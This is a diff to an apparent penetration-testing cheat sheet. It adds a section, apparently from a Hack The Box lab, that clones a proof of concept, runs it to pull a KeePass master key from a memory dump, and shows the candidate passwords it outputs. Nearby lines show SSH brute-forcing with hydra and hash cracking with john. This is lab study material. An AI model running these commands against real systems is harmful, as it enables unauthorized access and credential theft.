@@ -1702,6 +1702,27 @@ hydra -l megan -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
 keepass2john Database.kdbx > key.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
 ````
+#### KeePass.dmp
+````
+sudo git clone https://github.com/CMEPW/keepass-dump-masterkey
+chmod +x poc.py
+
+python3 poc.py -d /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp 
+2023-09-27 20:32:29,743 [.] [main] Opened /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp
+Possible password: ●,dgr●d med fl●de
+Possible password: ●ldgr●d med fl●de
+Possible password: ●`dgr●d med fl●de
+Possible password: ●-dgr●d med fl●de
+Possible password: ●'dgr●d med fl●de
+Possible password: ●]dgr●d med fl●de
+Possible password: ●Adgr●d med fl●de
+Possible password: ●Idgr●d med fl●de
+Possible password: ●:dgr●d med fl●de
+Possible password: ●=dgr●d med fl●de
+Possible password: ●_dgr●d med fl●de
+Possible password: ●cdgr●d med fl●de
+Possible password: ●Mdgr●d med fl●de
+````
 #### Cracking Zip files
 ````
 unzip <file>
